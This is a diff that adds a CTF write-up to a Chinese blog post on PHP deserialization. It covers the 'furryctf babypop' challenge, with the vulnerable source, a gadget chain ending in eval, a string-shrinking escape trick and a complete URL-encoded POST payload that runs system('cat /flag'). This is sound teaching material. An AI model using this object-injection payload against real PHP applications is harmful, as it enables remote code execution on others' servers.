@@ -2,7 +2,6 @@
 title: PHP反序列化漏洞
 date: 2025-12-24 16:41:59
 tags:
-index_img: https://gitee.com/bobrocket/img/raw/master/img/6950cbe3a0c391c56de5dcf8.png
 categories: CTF
 ---
 
@@ -857,7 +856,162 @@ with open('2.phar','rb') as fi:
 print(fin.text)
 ```
 
+### 4.7 [furryctf]babypop
 
+之前新春杯做了一个字符增多的逃逸，这次是减少的，更抽象一些
+
+```php
+<?php
+error_reporting(0);
+highlight_file(__FILE__);
+class SecurityProvider {
+    private $token;
+    public function __construct() {
+        $this->token = md5(uniqid());
+    }
+    public function verify($data) {
+        if (strpos($data, '..') !== false) {
+            die("Attack Detected");
+        }
+        return $data;
+    }
+}
+class LogService {
+    protected $handler;
+    protected $formatter;
+    
+    public function __construct($handler = null) {
+        $this->handler = $handler;
+        $this->formatter = new DateFormatter();
+    }
+
+    public function __destruct() {
+        if ($this->handler && method_exists($this->handler, 'close')) {
+            $this->handler->close();
+        }
+    }
+}
+class FileStream {
+    private $path;
+    private $mode;
+    public $content; 
+    public function __construct($path, $mode) {
+        $this->path = $path;
+        $this->mode = $mode;
+    }
+    public function close() {
+        if ($this->mode === 'debug' && !empty($this->content)) {
+            $cmd = $this->content;
+            if (strlen($cmd) < 2) return;
+            @eval($cmd);
+        } else {
+            return true;
+        }
+    }
+}
+class DateFormatter {
+    public function format($timestamp) {
+        return date('Y-m-d H:i:s', $timestamp);
+    }
+}
+class UserProfile {
+    public $username;
+    public $bio;
+    public $preference; 
+
+    public function __construct($u, $b) {
+        $this->username = $u;
+        $this->bio = $b;
+        $this->preference = new DateFormatter();
+    }
+}
+class DataSanitizer {
+    public static function clean($input) {
+        return str_replace("hacker", "", $input);
+    }
+}
+$raw_user = $_POST['user'] ?? null;
+$raw_bio = $_POST['bio'] ?? null;
+if ($raw_user && $raw_bio) {
+    $sec = new SecurityProvider();
+    $sec->verify($raw_user);
+    $sec->verify($raw_bio);
+    $profile = new UserProfile($raw_user, $raw_bio);
+    $data = serialize($profile);
+    if (strlen($data) > 4096) {
+        die("Data too long");
+    }
+    $safe_data = DataSanitizer::clean($data); //字符减少
+    $unserialized = unserialize($safe_data);
+    if ($unserialized instanceof UserProfile) {
+        echo "Profile loaded for " . htmlspecialchars($unserialized->username);
+    }
+}
+```
+
+链子很简单，关键是如何调用
+
+```
+$a = new FileStream("123","debug");
+$a -> content = "system('cat /flag');";
+$b = new LogService($a);
+```
+
+我们最终的$safe_data长这样
+
+```
+O:11:"UserProfile":3:{s:8:"username";s:x:"xxx";s:3:"bio";s:x:"xxx";s:10:"preference";O:13:"DateFormatter":0:{}}
+```
+
+我们可控两部分，最终目的就是让`UserProfile->preference = $b`从而调用链子
+
+也就是需要把`";s:3:"bio";s:xxx:"`吃掉从而加入恶意代码，这里只有21个字符所以我们补5个A
+
+```php
+<?php
+class LogService {
+    protected $handler;
+    protected $formatter;
+
+    public function __construct($handler = null) {
+        $this->handler = $handler;
+        $this->formatter = new DateFormatter();
+    }
+}
+class FileStream {
+    private $path;
+    private $mode;
+    public $content;
+    public function __construct($path, $mode) {
+        $this->path = $path;
+        $this->mode = $mode;
+    }
+}
+class DateFormatter {
+    public function format($timestamp) {
+        return date('Y-m-d H:i:s', $timestamp);
+    }
+}
+
+$a = new FileStream("123","debug");
+$a -> content = "system('cat /flag');";
+$b = new LogService($a);
+
+echo serialize($b);
+
+$payload = '";s:10:"preference";'.serialize($b);
+
+echo "\n";
+echo urlencode($payload);
+```
+
+最终
+
+```
+bio=AAAAA%22%3Bs%3A10%3A%22preference%22%3BO%3A10%3A%22LogService%22%3A2%3A%7Bs%3A10%3A%22%00*%00handler%22%3BO%3A10%3A%22FileStream%22%3A3%3A%7Bs%3A16%3A%22%00FileStream%00path%22%3Bs%3A3%3A%22123%22%3Bs%3A16%3A%22%00FileStream%00mode%22%3Bs%3A5%3A%22debug%22%3Bs%3A7%3A%22content%22%3Bs%3A20%3A%22system%28%27cat+%2Fflag%27%29%3B%22%3B%7D&user=hackerhackerhackerhacker
+```
+
+## 
 
 ## 参考文献
 
